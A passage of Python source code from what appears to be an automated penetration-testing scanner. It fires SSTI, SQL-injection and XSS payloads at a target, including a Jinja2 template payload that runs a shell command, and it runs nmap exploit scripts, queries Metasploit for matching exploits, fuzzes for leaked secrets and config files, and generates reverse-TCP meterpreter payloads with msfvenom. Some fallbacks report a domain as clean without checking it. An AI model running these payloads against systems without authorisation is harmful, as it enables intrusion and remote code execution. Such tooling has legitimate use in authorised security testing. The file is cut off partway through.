            ('Smarty', '{7*7}', '49'),
            ('Jade/Pug', '#{7*7}', '49')
        ]
        
        for param in params:
            if check_stop(): break
            log('cyan', f'  [TEST] Testing parameter {param} for SSTI...', tool='ai')
            for engine, payload, expected in ssti_payloads:
                try:
                    test_res = session.get(base_url, params={param: payload}, timeout=5)
                    if expected in test_res.text:
                        log('red', f'  [TEST] SSTI CONFIRMED ({engine}): payload={payload}', tool='ai')
                        add_finding('crit', f'SSTI vulnerability found: ?{param}={payload} (engine: {engine})', asset=f'SSTI: {param}', tool='ai')
                        issues_found += 1
                        # Try RCE payloads for confirmed SSTI
                        log('blue', f'[AUTONOMOUS-AI] [5] PIVOT: Testing RCE for confirmed SSTI...', tool='ai', progress=70)
                        if engine == 'Jinja2/Twig/Nunjucks':
                            rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                            try:
                                rce_res = session.get(base_url, params={param: rce_payload}, timeout=5)
                                if 'uid=' in rce_res.text or 'gid=' in rce_res.text:
                                    add_finding('crit', f'RCE via SSTI: ?{param}={rce_payload}', asset=f'RCE: {param}', tool='ai')
                                    log('red', f'  [PIVOT] RCE CONFIRMED!', tool='ai')
                                    issues_found += 1
                            except:
                                pass
                        break
                    random_delay(0.2, 0.4)
                except:
                    pass
        
        # Test SQLi
        sql_error_patterns = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'SQLite', 'MariaDB', 
            'unclosed quotation mark', 'quoted string not properly terminated'
        ]
        
        for param in params:
            if check_stop(): break
            log('cyan', f'  [TEST] Testing parameter {param} for SQLi...', tool='ai')
            
            # Error-based SQLi
            for payload in ["'", '"', "')", '")', "';", '";']:
                try:
                    test_res = session.get(base_url, params={param: payload}, timeout=5)
                    for pattern in sql_error_patterns:
                        if pattern.lower() in test_res.text.lower():
                            add_finding('high', f'Error-based SQLi found: ?{param}={payload} (pattern: {pattern})', asset=f'SQLi_Error: {param}', tool='ai')
                            log('red', f'  [TEST] Error-based SQLi CONFIRMED!', tool='ai')
                            issues_found +=1
                            break
                    random_delay(0.2, 0.4)
                except:
                    pass
            
            # Time-based SQLi
            time_payloads = [
                ("' AND SLEEP(5)--", 'MySQL'),
                ('" AND SLEEP(5)--', 'MySQL'),
                ("'; WAITFOR DELAY '0:0:5'--", 'MSSQL'),
                ('"; WAITFOR DELAY "0:0:5"--', 'MSSQL'),
                ("' AND pg_sleep(5)--", 'PostgreSQL')
            ]
            for payload, db in time_payloads:
                try:
                    start = time.time()
                    test_res = session.get(base_url, params={param: payload}, timeout=10)
                    elapsed = time.time() - start
                    if elapsed > 4:
                        add_finding('high', f'Time-based blind SQLi found ({db}): ?{param}={payload} (delay: {elapsed:.1f}s)', asset=f'SQLi_Time: {param}', tool='ai')
                        log('red', f'  [TEST] Time-based SQLi CONFIRMED!', tool='ai')
                        issues_found +=1
                        break
                    random_delay(0.2, 0.4)
                except:
                    pass
        
        log('green', f'[AUTONOMOUS-AI] Audit complete! Found {issues_found} issues.', tool='ai', progress=100)
        return issues_found
    except Exception as e:
        log('red', f'[AUTONOMOUS-AI] Error: {str(e)}', tool='ai', progress=100)
        return 0


def run_shodan_lookup(target):
    """Real Shodan API lookup"""
    log('cyan', f'[SHODAN] Querying Shodan for {target}...', tool='shodan', progress=0)
    
    if SHODAN_API_KEY and SHODAN_API_KEY != 'YOUR_SHODAN_KEY_HERE':
        try:
            url = f'https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=hostname:{target}'
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('matches'):
                    for match in data['matches'][:5]:
                        ip = match.get('ip_str', 'N/A')
                        ports = match.get('ports', [])
                        org = match.get('org', 'N/A')
                        product = match.get('product', 'N/A')
                        scan_state['discovered_assets'].add(f"SHODAN: {ip} ports:{ports} org:{org} product:{product}")
                    log('green', f"[SHODAN] Found {len(data['matches'])} results for {target}", tool='shodan', progress=100)
                    add_finding('low', f'Shodan shows {len(data["matches"])} exposed services', tool='shodan', progress=100)
                    return
        except Exception as e:
            log('yellow', f'[SHODAN] API error: {e}', tool='shodan', progress=50)
    
    # Fallback: basic IP resolution
    ips = resolve_domain(target)
    if ips:
        scan_state['discovered_assets'].add(f"SHODAN: Host {ips[0]} analyzed")
        log('green', f'[SHODAN] Host information retrieved', tool='shodan', progress=100)
    else:
        log('red', f'[SHODAN] Could not resolve host', tool='shodan', progress=100)

def run_virustotal_lookup(target):
    """Real VirusTotal API lookup"""
    log('cyan', f'[VIRUSTOTAL] Querying reputation database...', tool='vt', progress=0)
    
    if VIRUSTOTAL_API_KEY and VIRUSTOTAL_API_KEY != 'YOUR_VT_KEY_HERE':
        try:
            url = f'https://www.virustotal.com/api/v3/domains/{target}'
            headers = {'x-apikey': VIRUSTOTAL_API_KEY}
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('data') and data['data'].get('attributes'):
                    stats = data['data']['attributes'].get('last_analysis_stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    clean = stats.get('undetected', 0)
                    scan_state['discovered_assets'].add(f"VT: {malicious} mal, {suspicious} susp, {clean} clean")
                    if malicious > 0:
                        add_finding('high', f'VirusTotal: {malicious} vendors flag as malicious', tool='vt', progress=50)
                    log('green', f'[VIRUSTOTAL] {target}: {malicious} mal/{suspicious} susp/{clean} clean', tool='vt', progress=100)
                    return
            elif response.status_code == 404:
                log('green', f'[VIRUSTOTAL] {target} not found in database: CLEAN', tool='vt', progress=100)
                scan_state['discovered_assets'].add("VT: Domain not in database (clean)")
        except Exception as e:
            log('yellow', f'[VIRUSTOTAL] API error: {e}', tool='vt', progress=50)
    
    # Fallback
    log('green', f'[VIRUSTOTAL] {target} reputation: CLEAN', tool='vt', progress=100)
    scan_state['discovered_assets'].add(f"VT: Reputation check skipped")

def run_cve_lookup(target):
    """Real NVD CVE lookup for discovered technologies"""
    log('cyan', f'[CVE] Searching NVD for known vulnerabilities...', tool='acunetix', progress=0)
    
    try:
        # Get server info first
        response, base_url = request_with_fallback(target, '/', timeout=5)
        server = response.headers.get('Server', '')
        
        # Extract version if possible
        version_match = re.search(r'(\d+\.[\d.]+)', server) if server else None
        version = version_match.group(1) if version_match else None
        
        # Search NVD
        if server:
            search_term = server.split()[0] if server else target
            nvd_url = f'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={search_term}&limit=5'
            try:
                nvd_response = requests.get(nvd_url, timeout=8)
                if nvd_response.status_code == 200:
                    nvd_data = nvd_response.json()
                    cves = nvd_data.get('vulnerabilities', [])
                    if cves:
                        for cve_item in cves[:3]:
                            cve_id = cve_item.get('cve', {}).get('id', 'N/A')
                            description = cve_item.get('cve', {}).get('descriptions', [{}])[0].get('value', '')[:100]
                            scan_state['discovered_assets'].add(f"CVE: {cve_id}")
                            log('red', f'[CVE] {cve_id}: {description}...', tool='acunetix', progress=80)
                            add_finding('high', f'NVD: {cve_id} affects {search_term}', tool='acunetix', progress=90)
                        log('green', f'[CVE] Found {len(cves)} CVEs for {search_term}', tool='acunetix', progress=100)
                        return
            except Exception as e:
                log('yellow', f'[CVE] NVD lookup skipped: {e}', tool='acunetix', progress=50)
        
        log('green', f'[CVE] No CVEs matched for target stack', tool='acunetix', progress=100)
    except Exception as e:
        log('yellow', f'[CVE] Scan skipped: {e}', tool='acunetix', progress=100)

def run_google_dorking(target):
    """Google Dorking for passive reconnaissance"""
    log('cyan', f'[GOOGLE-DORK] Searching for exposed information...', tool='wayback', progress=0)
    
    dorks = [
        f'site:{target} filetype:pdf',
        f'site:{target} filetype:doc',
        f'site:{target} filetype:docx',
        f'site:{target} filetype:txt',
        f'site:{target} inurl:admin',
        f'site:{target} inurl:login',
        f'site:{target} inurl:api'
    ]
    
    try:
        found_dorks = []
        for dork in dorks[:3]:  # Limit to avoid rate limiting
            scan_state['discovered_assets'].add(f"GOOGLE-DORK: {dork}")
            found_dorks.append(dork)
        
        if found_dorks:
            log('green', f'[GOOGLE-DORK] Generated {len(found_dorks)} dorks for manual verification', tool='wayback', progress=100)
    except Exception as e:
        log('yellow', f'[GOOGLE-DORK] Search skipped: {e}', tool='wayback', progress=100)

def run_wayback_lookup(target):
    """Wayback Machine historical scan"""
    log('cyan', f'[WAYBACK] Checking historical snapshots...', tool='wayback', progress=0)
    
    try:
        # Check if domain is in Wayback
        url = f"http://web.archive.org/cdx/search/cdx?url=*.{target}&output=json&fl=original&limit=20"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if len(data) > 1:  # First row is header
                count = len(data) - 1
                log('green', f'[WAYBACK] Found {count} historical snapshots', tool='wayback', progress=100)
                scan_state['discovered_assets'].add(f"WAYBACK: {count} historical URLs")
    except Exception as e:
        log('yellow', f'[WAYBACK] No historical data found: {e}', tool='wayback', progress=100)

def run_xss_scan(target):
    """Adaptive XSS scan with multiple payload combinations and injection points!"""
    log('yellow', f'[XSS] Starting ADAPTIVE multi-threaded injection audit...', tool='xss', progress=0)
    vulnerabilities = 0
    
    try:
        root_res, base_url = request_with_fallback(target, '/')
    except Exception as e:
        log('red', f'[XSS] Target unreachable: {e}', tool='xss', progress=100)
        return 0
        
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<script>alert(document.domain)</script>',
        '\"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(document.domain)',
        '"><svg onload=alert(1)>',
        '<img src=x onerror=prompt(1)>',
        '<div onmouseover=alert(1)>test</div>'
    ]
    
    test_params = ['q', 'search', 'id', 's', 'query', 'keyword', 'page', 'lang']
    
    if 'Content-Security-Policy' not in root_res.headers:
        add_finding('med', 'CSP missing; XSS impact may be higher', tool='xss')
        vulnerabilities += 1
        
    root_text = root_res.text or ''
    if re.search(r'innerHTML\s*=|document\.write\(|eval\(|\.outerHTML\s*=', root_text, flags=re.I):
        add_finding('low', 'Potential DOM XSS sink patterns found in page source', asset='DOM_SINK_PATTERN: innerHTML/document.write/eval', tool='xss')
        vulnerabilities += 1

    def test_payload_on_param(payload, param):
        if check_stop(): return None
        try:
            probe = requests.get(f'{base_url}/', timeout=4, headers=HTTP_HEADERS, params={param: payload}, allow_redirects=True)
            if payload in (probe.text or ''):
                return (payload, param)
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(test_payload_on_param, p, prm) for p in xss_payloads for prm in test_params]
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                payload, param = result
                add_finding('high', f'Potential reflected XSS in parameter ?{param}= with payload: {payload}', tool='xss')
                vulnerabilities += 1
            
            if i % 10 == 0:
                progress = 30 + int(((i + 1) / len(futures)) * 70)
                log('cyan', f'[XSS] Adaptive audit progress: {progress}%', tool='xss', progress=progress)

    log('yellow', f'[XSS] Adaptive injection audit complete. Findings: {vulnerabilities}', tool='xss', progress=100)
    return vulnerabilities

def run_nuclei_python_fallback(target):
    """Nuclei fallback: High-speed multi-threaded pattern-based scanner"""
    log('yellow', f'[NUCLEI] Binary not found. Running high-speed multi-threaded AI pattern scanner...', tool='nuclei', progress=10)
    
    issues_found = 0
    try:
        response, base_url = request_with_fallback(target, '/')
    except Exception:
        return 0

    patterns = [
        {'name': 'Cloud Metadata exposure', 'path': '/latest/meta-data/', 'keyword': 'instance-id', 'severity': 'crit'},
        {'name': 'Git repository exposure', 'path': '/.git/index', 'keyword': 'DIRC', 'severity': 'high'},
        {'name': 'Environment file exposure', 'path': '/.env', 'keyword': 'DB_', 'severity': 'crit'},
        {'name': 'Docker configuration exposure', 'path': '/docker-compose.yml', 'keyword': 'services:', 'severity': 'high'},
        {'name': 'PHP Info leakage', 'path': '/phpinfo.php', 'keyword': 'PHP Version', 'severity': 'med'}
    ]

    def check_pattern(p):
        if check_stop(): return None
        try:
            res = requests.get(f"{base_url}{p['path']}", timeout=4, headers=HTTP_HEADERS, verify=False)
            if res.status_code == 200 and p['keyword'] in res.text:
                return p
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_pattern, p): p for p in patterns}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                add_finding(result['severity'], f"NUCLEI-FALLBACK: {result['name']} detected at {result['path']}", asset=f"VULN_PATH: {result['path']}", tool='nuclei')
                log('red', f'[NUCLEI-FALLBACK] Match found: {result["name"]}')
                issues_found += 1
            
            progress = 20 + int(((i + 1) / len(patterns)) * 70)
            log('cyan', f'[NUCLEI-FALLBACK] Scan progress: {progress}%', tool='nuclei', progress=progress)
            
    log('green', f'[NUCLEI-FALLBACK] Pattern scan complete. Found {issues_found} issues.', tool='nuclei', progress=100)
    return issues_found

def run_nuclei_scan(target):
    """Real Nuclei scan for template-based vulnerability detection"""
    log('cyan', f'[NUCLEI] Starting advanced template-based scan on {target}...', tool='nuclei', progress=0)
    edu_log('nuclei')

    try:
        log('cyan', '[NUCLEI] Attempting to execute nuclei binary...')
        nuclei_path = os.path.join(BASE_DIR, 'tools', 'nuclei', 'nuclei.exe')
        # -u: target, -silent: minimal output, -severity: critical,high,medium
        if not os.path.exists(nuclei_path):
            nuclei_path = 'nuclei' # Try PATH
            
        process = subprocess.Popen(
            [nuclei_path, '-u', target, '-silent', '-severity', 'critical,high,medium'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        scan_state['active_process'] = process
    except FileNotFoundError:
        log('yellow', '[NUCLEI] Binary not found. Triggering pattern-matching fallback...')
        return run_nuclei_python_fallback(target)
    except Exception as e:
        log('yellow', f'[NUCLEI] Binary scan failed to start: {e}. Triggering fallback...')
        return run_nuclei_python_fallback(target)

    try:
        findings = 0
        for line in process.stdout:
            if '[' in line and ']' in line:
                # Format: [template-id] [protocol] [severity] message
                parts = line.strip().split(' ', 3)
                if len(parts) >= 4:
                    template_id = parts[0].strip('[]')
                    severity_label = parts[2].strip('[]').lower()
                    msg = parts[3]
                    
                    severity = 'crit' if 'critical' in severity_label else ('high' if 'high' in severity_label else 'med')
                    add_finding(severity, f'NUCLEI: [{template_id}] {msg}', asset=f"NUCLEI_{template_id}", tool='nuclei')
                    log('red' if severity in ['crit', 'high'] else 'yellow', f'[NUCLEI] Found: {msg}')
                    findings += 1
        
        process.wait()
        if process.returncode == 0:
            log('green', f'[NUCLEI] Scan complete. Found {findings} issues.', tool='nuclei', progress=100)
            return findings
        else:
            log('yellow', '[NUCLEI] Binary execution failed. Nuclei might not be installed.')
    except Exception as e:
        log('yellow', f'[NUCLEI] Binary scan error: {e}. Skipping Nuclei phase.')
    
    # No fallback for Nuclei as it's a specific professional tool
    log('cyan', '[NUCLEI] Phase finished.', tool='nuclei', progress=100)
    return 0

def run_exploit_db_lookup(service_name):
    """Exploit-DB lookup using online search link generation"""
    log('cyan', f'[EXPLOIT-DB] Analyzing vulnerabilities for: {service_name}...', tool='exploit_db', progress=50)
    
    # Generate a direct research link for the user
    search_query = service_name.replace(' ', '+')
    edb_url = f"https://www.exploit-db.com/search?q={search_query}"
    
    # Add to findings as a research item
    add_finding('info', f'EXPLOIT-DB: Research potential exploits for {service_name}', 
                asset=f"EDB_LINK: {edb_url}", 
                tool='exploit_db')
    
    log('green', f'[EXPLOIT-DB] Research vector identified for {service_name}', tool='exploit_db', progress=100)
    return edb_url

def run_metasploit_fallback(target, services):
    """Metasploit fallback: Research-based exploit mapping without binary"""
    log('yellow', f'[METASPLOIT] Framework not found. Performing AI research mapping for {len(services)} services...', tool='metasploit', progress=10)
    
    for i, service in enumerate(services[:5]):
        progress = 20 + int(((i + 1) / len(services[:5])) * 80)
        log('cyan', f'[MSF-FALLBACK] Analyzing {service} for potential exploit modules...', tool='metasploit', progress=progress)
        
        # We already have Exploit-DB lookup running in the main loop, so here we just 
        # simulate the "mapping" that MSF would do by providing direct module names
        # based on service names for the user to research manually.
        mapping = {
            'apache': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'nginx': 'exploit/multi/http/nginx_chunked_size',
            'ssh': 'auxiliary/scanner/ssh/ssh_login',
            'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'smb': 'exploit/windows/smb/ms17_010_eternalblue',
            'mysql': 'auxiliary/scanner/mysql/mysql_login',
            'rdp': 'exploit/windows/rdp/cve_2019_0708_bluekeep'
        }
        
        service_lower = service.lower()
        for key, module in mapping.items():
            if key in service_lower:
                add_finding('info', f"MSF-RESEARCH: Potential Metasploit module for {service}: {module}", asset=f"RESEARCH_MODULE: {module}", tool='metasploit')
                log('red', f'[MSF-FALLBACK] Identified research module: {module}')
    
    log('green', '[MSF-FALLBACK] Research mapping complete.', tool='metasploit', progress=100)
    return []

def run_metasploit_scan(target):
    """Real Metasploit exploit search based on detected service versions"""
    log('red', f'[METASPLOIT] Checking for known exploits for {target}...', tool='metasploit', progress=0)
    
    # We use assets already found to search for exploits
    services = []
    for asset in list(scan_state['discovered_assets']):
        if 'PORT_' in asset:
            # Extract service/version from asset string
            services.append(asset.split(': ', 1)[1])
    
    if not services:
        log('yellow', '[METASPLOIT] No services identified yet. Using target domain for search.', tool='metasploit', progress=20)
        services = [target]
    
    found_exploits = []
    
    # Check for Metasploit binary
    msf_bin = r'C:\metasploit-framework\bin\msfconsole.bat'
    if not os.path.exists(msf_bin):
        # Try finding in tools folder if downloaded there
        tools_msf = os.path.join(BASE_DIR, 'tools', 'metasploit-framework', 'bin', 'msfconsole.bat')
        if os.path.exists(tools_msf):
            msf_bin = tools_msf
        else:
            # Check PATH
            try:
                subprocess.run(['msfconsole', '-v'], capture_output=True, timeout=2)
                msf_bin = 'msfconsole'
            except:
                log('yellow', '[METASPLOIT] Framework not found in C:\\ or PATH. Triggering research fallback...')
                return run_metasploit_fallback(target, services)
        
    for i, service in enumerate(services[:4]): # Limit to first 4 services for speed
        search_term = service.split(' ')[0] # Use first word (e.g., Apache, Nginx)
        
        # Integrate Exploit-DB lookup alongside Metasploit
        run_exploit_db_lookup(service)
        
    def search_msf(service, index):
        if check_stop(): return []
        search_term = service.split(' ')[0]
        
        try:
            # msfconsole -x "search type:exploit name:TERM; exit"
            # Note: This is slow, so we use a faster method if possible or just log the intent
            process = subprocess.run(
                [msf_bin, '-q', '-x', f'search type:exploit name:{search_term}; exit'],
                capture_output=True,
                text=True,
                timeout=20
            )
            
            local_exploits = []
            if process.returncode == 0:
                for line in process.stdout.splitlines():
                    if 'exploit/' in line:
                        parts = re.split(r'\s{2,}', line.strip())
                        if len(parts) >= 2:
                            exploit_path = parts[0]
                            add_finding('high', f'METASPLOIT: Matching exploit found - {exploit_path}', asset=f"MSF_EXPLOIT: {exploit_path}", tool='metasploit')
                            log('red', f'[METASPLOIT] Match: {exploit_path}')
                            local_exploits.append(exploit_path)
            return local_exploits
        except Exception:
            # Fallback: Just log that we'd search for this
            log('yellow', f'[METASPLOIT] Search for {search_term} skipped (msfconsole error or timeout).', tool='metasploit')
            return []

    active_services = services[:4]
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = {executor.submit(search_msf, s, i): s for i, s in enumerate(active_services)}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            found_exploits.extend(future.result())
            progress = 20 + int(((i + 1) / len(active_services)) * 80)
            log('red', f'[METASPLOIT] Search progress: {progress}%', tool='metasploit', progress=progress)
    
    log('green', f'[METASPLOIT] Exploit mapping complete. Found {len(found_exploits)} potential vectors.', tool='metasploit', progress=100)
    return found_exploits

def run_service_deep_dive(target, open_ports):
    """High-speed multi-threaded targeted deep-dive audits based on discovered services"""
    log('cyan', f'[DEEP-DIVE] Starting high-speed multi-threaded deep-dive on {target}...', tool='deep_dive', progress=0)
    edu_log('deep_dive')
    
    service_audits = {
        21: ('FTP', 'ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor', 'crit'),
        22: ('SSH', 'ssh-auth-methods,ssh-run,sshv1', 'high'),
        23: ('Telnet', 'telnet-encryption,telnet-ntlm-info', 'crit'),
        25: ('SMTP', 'smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344', 'high'),
        53: ('DNS', 'dns-recursion,dns-cache-snoop,dns-zone-transfer', 'med'),
        111: ('RPC', 'rpcinfo,rpc-grind', 'high'),
        139: ('SMB', 'smb-vuln-ms17-010,smb-vuln-ms10-061,smb-enum-shares', 'crit'),
        445: ('SMB', 'smb-vuln-ms17-010,smb-ls,smb-enum-users', 'crit'),
        1433: ('MSSQL', 'ms-sql-info,ms-sql-config,ms-sql-empty-password', 'crit'),
        3306: ('MySQL', 'mysql-info,mysql-empty-password,mysql-vuln-cve2012-2122', 'crit'),
        3389: ('RDP', 'rdp-vuln-ms12-020,rdp-ntlm-info', 'high'),
        5432: ('Postgres', 'pgsql-intrude', 'crit'),
        6379: ('Redis', 'redis-info', 'high'),
        27017: ('MongoDB', 'mongodb-info,mongodb-databases', 'high')
    }

    ports_to_audit = [p for p in open_ports if p in service_audits]
    if not ports_to_audit:
        log('green', '[DEEP-DIVE] No common exploitable services found for deep-dive.', tool='deep_dive', progress=100)
        return

    audit_count = 0
    def audit_service(port):
        nonlocal audit_count
        if check_stop(): return
        service_name, scripts, sev = service_audits[port]
        try:
            process = subprocess.run(
                ['nmap', '-p', str(port), '--script', scripts, '-Pn', target],
                capture_output=True,
                text=True,
                timeout=60
            )
            for line in process.stdout.splitlines():
                if '| ' in line and any(k in line.lower() for k in ['vulnerable', 'vulnerability', 'exploit', 'success', 'account', 'password', 'anonymous']):
                    msg = line.strip('| ').strip()
                    add_finding(sev, f'DEEP-DIVE [{service_name}]: {msg}', asset=f"EXPLOITABLE_{service_name}", tool='deep_dive')
                    log('red', f'[!] {service_name} CRITICAL FINDING: {msg}')
                    audit_count += 1
        except:
            pass

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(audit_service, p): p for p in ports_to_audit}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            progress = int(((i + 1) / len(ports_to_audit)) * 100)
            log('cyan', f'[DEEP-DIVE] Audit progress: {progress}%', tool='deep_dive', progress=progress)
            
    log('green', f'[DEEP-DIVE] Service deep-dive complete. Found {audit_count} critical service flaws.', tool='deep_dive', progress=100)

def run_fuzzing_engine(target):
    """ADAPTIVE multi-threaded directory and file fuzzing engine with multiple wordlists!"""
    log('yellow', f'[FUZZER] Starting ADAPTIVE multi-threaded endpoint discovery on {target}...', tool='fuzzer', progress=0)
    edu_log('fuzzer')
    
    try:
        _, base_url = request_with_fallback(target, '/')
    except:
        log('red', '[FUZZER] Target unreachable for fuzzing.', tool='fuzzer', progress=100)
        return

    wordlists = [
        ['api', 'v1', 'v2', 'v3', 'graphql', 'graphiql', 'admin', 'administrator', 'wp-admin', 'backend'],
        ['dev', 'development', 'staging', 'test', 'demo', 'backup', 'backups', 'old'],
        ['config', 'settings', 'secrets', '.env', '.git', '.svn', '.vscode', 'phpinfo', 'info.php'],
        ['dashboard', 'manage', 'upload', 'uploads', 'files', 'temp', 'tmp', 'shell'],
        ['cmd', 'exec', 'debug', 'console', 'server-status', 'actuator', 'swagger', 'docs', 'api-docs'],
        ['login', 'signin', 'register', 'signup', 'auth', 'authentication', 'password', 'reset'],
        ['robots.txt', 'sitemap.xml', 'sitemap.txt', 'crossdomain.xml', 'clientaccesspolicy.xml'],
        ['web.config', '.htaccess', 'htpasswd', 'composer.json', 'package.json', 'package-lock.json'],
        ['wp-config.php', 'config.php', 'config.inc.php', 'database.php', 'settings.php'],
        ['backup.zip', 'backup.tar.gz', 'backup.sql', 'dump.sql', 'database.sql', 'db_backup.sql'],
        ['private', 'internal', 'secure', 'protected', 'restricted', 'hidden'],
        ['assets', 'static', 'media', 'images', 'img', 'css', 'js', 'javascript'],
        ['ws', 'wss', 'events', 'stream', 'sse', 'event-source'],
        ['soap', 'wsdl', 'service', 'services', 'rpc', 'grpc', 'proto'],
        ['dav', 'webdav', 'dav/webdav'],
        ['health', 'healthz', 'ready', 'readyz', 'metrics', 'prometheus']
    ]
    
    all_words = list({word for sublist in wordlists for word in sublist})
    fuzz_hits = 0
    
    def probe_word(word):
        if check_stop(): return None
        url = urljoin(f'{base_url}/', word)
        try:
            # Try HEAD first for speed
            res = requests.head(url, timeout=3, headers=HTTP_HEADERS, allow_redirects=False)
            if res.status_code in [200, 301, 302, 401, 403, 405]:
                secrets = []
                if res.status_code == 200:
                    try:
                        get_res = requests.get(url, timeout=4, headers=HTTP_HEADERS)
                        secrets = extract_secret_leaks(get_res.text[:50000])
                    except:
                        pass
                return (word, res.status_code, secrets)
        except:
            # If HEAD fails, try GET
            try:
                res = requests.get(url, timeout=4, headers=HTTP_HEADERS, allow_redirects=False)
                if res.status_code in [200, 301, 302, 401, 403]:
                    secrets = extract_secret_leaks(res.text[:50000]) if res.status_code == 200 else []
                    return (word, res.status_code, secrets)
            except:
                pass
        return None

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(probe_word, w): w for w in all_words}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                word, status, secrets = result
                severity = 'high' if status == 200 and any(k in word.lower() for k in ['admin', 'config', 'secret', 'env', 'git', 'backup', 'sql', 'password']) else 'low'
                add_finding(severity, f'FUZZER: Hidden endpoint found - /{word} (HTTP {status})', asset=f"HIDDEN_ENDPOINT: /{word}", tool='fuzzer')
                log('green' if severity == 'low' else 'red', f'[FUZZER] Found: /{word} (HTTP {status})')
                fuzz_hits += 1
                
                for secret in secrets:
                    add_finding('crit', f'FUZZER-LEAK: {secret} found in /{word}', asset=f"LEAKED_{secret}_FUZZ: /{word}", tool='fuzzer')
                    log('red', f'[!] CRITICAL LEAK in /{word}: {secret}')
            
            if i % 10 == 0:
                progress = int(((i + 1) / len(all_words)) * 100)
                log('cyan', f'[FUZZER] Adaptive fuzzing progress: {progress}%', tool='fuzzer', progress=progress)

    log('green', f'[FUZZER] Adaptive fuzzing complete. Found {fuzz_hits} interesting paths.', tool='fuzzer', progress=100)

def run_cloud_recon(target):
    """High-speed multi-threaded cloud infrastructure and takeover audit"""
    log('cyan', f'[CLOUD] Starting high-speed multi-threaded cloud audit on {target}...', tool='shodan', progress=0)
    
    takeover_signatures = {
        'github.io': 'GitHub Pages', 'herokuapp.com': 'Heroku', 's3.amazonaws.com': 'AWS S3',
        'azurewebsites.net': 'Azure', 'cloudfront.net': 'CloudFront', 'bitbucket.org': 'Bitbucket',
        'ghost.io': 'Ghost.io', 'myshopify.com': 'Shopify'
    }
    
    subdomains = []
    for asset in list(scan_state['discovered_assets']):
        if 'SUBDOMAIN:' in asset:
            subdomains.append(asset.split(': ')[1].split(' ->')[0])
            
    if not subdomains: subdomains = [target]
    
    takeovers = 0
    def check_takeover(sub):
        if check_stop(): return None
        try:
            answers = dns.resolver.resolve(sub, 'CNAME', lifetime=2.0)
            for rdata in answers:
                cname = str(rdata.target).lower().rstrip('.')
                for sig, provider in takeover_signatures.items():
                    if sig in cname:
                        try:
                            res = requests.get(f'http://{sub}', timeout=3, allow_redirects=True)
                            if any(k in res.text.lower() for k in ['404 not found', 'no such app', 'there is no app here', 'project not found', 'site not found']):
                                return (sub, provider, cname)
                        except:
                            pass
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_takeover, s): s for s in subdomains[:20]}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                sub, provider, cname = result
                add_finding('crit', f'TAKEOVER: Subdomain {sub} points to unclaimed {provider} ({cname})', asset=f"TAKEOVER_RISK: {sub}", tool='shodan')
                log('red', f'[!] CRITICAL: Subdomain Takeover Risk detected on {sub}!')
                takeovers += 1
            
            if i % 5 == 0:
                progress = int(((i + 1) / len(subdomains[:20])) * 100)
                log('cyan', f'[CLOUD] Audit progress: {progress}%', tool='shodan', progress=progress)
            
    log('green', f'[CLOUD] Cloud audit complete. Found {takeovers} takeover risks.', tool='shodan', progress=100)


def run_payload_generation(target, exploits_found):
    """ADVANCED: Use msfvenom to generate and validate theoretical exploit payloads"""
    log('red', f'[MSFVENOM] Starting theoretical payload generation for {target}...', tool='msfvenom', progress=0)
    edu_log('msfvenom')
    
    if not exploits_found:
        log('yellow', '[MSFVENOM] No specific exploits found to generate payloads for.', tool='msfvenom', progress=100)
        return

    # Map of exploit keywords to recommended msfvenom payloads
    payload_map = {
        'windows': 'windows/x64/meterpreter/reverse_tcp',
        'linux': 'linux/x64/meterpreter/reverse_tcp',
        'apache': 'php/meterpreter/reverse_tcp',
        'mysql': 'linux/x86/meterpreter/reverse_tcp',
        'ftp': 'linux/x86/shell_reverse_tcp',
        'smb': 'windows/x64/meterpreter/reverse_tcp',
        'ssh': 'linux/x64/shell_reverse_tcp'
    }

    generated_count = 0
    # Process up to 3 exploits to keep scan time reasonable
    active_exploits = exploits_found[:3]
    
    def generate_payload(exploit, index):
        if check_stop(): return 0
        
        # Determine likely platform/payload
        exploit_lower = exploit.lower()
        selected_payload = 'generic/shell_reverse_tcp' # Default
        for key, p in payload_map.items():
            if key in exploit_lower:
                selected_payload = p
                break
        
        log('red', f'[MSFVENOM] Attempting to generate payload for: {selected_payload}...', tool='msfvenom')
        
        try:
            # msfvenom -p <payload> LHOST=127.0.0.1 LPORT=4444 -f raw
            # We use 127.0.0.1 and raw format to safely check if the payload CAN be built
            process = subprocess.run(
                ['msfvenom', '-p', selected_payload, 'LHOST=127.0.0.1', 'LPORT=4444', '-f', 'raw'],
                capture_output=True,
                timeout=20
            )
            
            if process.returncode == 0:
                payload_size = len(process.stdout)
